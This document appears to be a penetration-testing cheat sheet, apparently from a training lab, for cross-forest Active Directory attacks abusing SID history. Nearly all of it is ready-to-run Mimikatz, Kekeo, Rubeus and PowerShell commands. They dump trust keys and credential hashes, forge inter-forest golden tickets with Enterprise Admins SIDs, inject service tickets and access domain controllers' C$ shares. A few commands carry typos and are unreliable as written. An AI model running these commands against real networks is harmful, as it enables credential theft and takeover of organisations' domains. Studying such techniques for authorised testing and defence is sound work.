# Cross Domain Attacks [ Forest Root - SID Abuse ]
## Methodology/Steps
> 1. Dump the trust keys of the inter-forest trusts
> 2. Note the SID of the current Domain, SID of the target Domain and the rc4_hmac_nt(Trust Key) of the target Domain.
>    (example : *ecorp$*)
> 3. We can forge a inter-forest TGT with the proper *target* and *rc4* parameters
> 4. Now request a TGS using **asktgs.exe**
> 5. Now Inject the TGS in the memory
> 6. Now we can access all the shared files admin DC
---

## Invoke-Mimikatz
### 1. We require the trust key of inter-forest trust
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\techcorp$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

### 2. Forge the inter-forest TGT
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:us.techcorp.local /sid:S-1-5-21-210670787- 2521448726-163245708 /sids:S-1-5-21-2781415573- 3701854478-2406986946-519 /rc4:b59ef5860ce0aa12429f4f61c8e51979 /user:Administrator /service:krbtgt /target:techcorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi"'

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:eu.local /sid:S-1-5-21-3657428294-2017276338-1274645009 /rc4:799a0ae7e6ce96369aa7f1e9da25175a /service:krbtgt /target:euvendor.local /sids:S-1-5-21-4066061358-3942393892-617142613-519 /ticket:C:\AD\Tools\kekeo_old\sharedwitheu.kirbi"'
```

### 3. Request a TGS
> Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket with Kekeo
```powershell
# keko
tgs::ask /tgt:C:\AD\Tools\trust_tkt.kirbi /service:CIFS/techcorp-dc.techcorp.local
# Or using older version of Kekeo
.\asktgs.exe C:\AD\Tools\trust_tkt.kirbi CIFS/techcorp-dc.techcorp.local
```

### 4. Inject and use the TGS
> Use the TGS to access the targeted service (may need to use it twice)
```powershell
misc::convert lsa TGS_Administrator@us.techcorp.local_krbtgt~TECHCORP.LOCAL@US.TECHCORP.LOCAL.kirbi 
# Or
.\kirbikator.exe lsa .\CIFS.techcorp-dc.techcorp.local.kirbi
ls \\techcorp-dc.techcorp.local\c$
```

## Rubeus
### 1. Create ticket and add it into the memory using asktgs
```powershell
# Rubeus
.\Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/techcorp-dc.techcorp.local /dc:techcorp-dc.techcorp.local /ptt

C:\Users\Public\Rubeus.exe asktgs /ticket:C:\Users\Public\sharedwitheu.kirbi /service:CIFS/euvendor-dc.euvendor.local /dc:euvendor-dc.euvendor.local /ptt

# can access the shares now
ls \\techcorp-dc.techcorp.local\c$
ls \\euvendor-dc.euvendor.local\c$
```

## PowerShell

### 1. Access the euvendor-net machine using PSRemoting
```powershell
# cmdlet
Invoke-Command -ScriptBlock{whoami} -ComputerName euvendornet.euvendor.local -Authentication NegotiateWithImplicitCredential
```

---

# Extras
### To use the DCSync feature for getting krbtg hash execute the below command with DC privileges
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsyn /domain:garrison.castle.local /all /cvs"'
```

### Get the ForeignSecurityPrincipal
```powershell
#These SIDs can access to the target domain
Get-DomainObject -Domain targetDomain.local | ? {$_.objectclass -match "foreignSecurityPrincipal"}

#With the by default SIDs, we find S-1-5-21-493355955-4215530352-779396340-1104
#We search it in our current domain
Get-DomainObject |? {$_.objectsid -match "S-1-5-21-493355955-4215530352-779396340-1104"}
```
